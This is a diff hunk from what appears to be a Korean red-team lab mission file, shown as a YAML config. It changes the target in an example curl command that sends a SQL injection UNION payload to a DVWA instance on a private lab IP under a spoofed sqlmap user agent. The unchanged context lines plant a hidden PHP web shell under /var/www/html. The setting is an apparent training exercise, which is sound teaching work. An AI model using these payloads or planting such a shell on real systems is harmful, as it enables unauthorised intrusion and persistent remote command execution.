@@ -42,7 +42,7 @@ red_missions:
       예시(id=kim):
       ```bash
       curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
-        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa13r1-kim%27%20UNION%20SELECT%201--+&Submit=Submit"
+        "http://192.168.0.161/vulnerabilities/sqli/?id=sa13r1-kim%27%20UNION%20SELECT%201--+&Submit=Submit"
       cat > /var/www/html/.sa13shell.php <<'PHP'
       <?php /* sa13 */ system($_POST['c'] ?? ''); ?>
       PHP
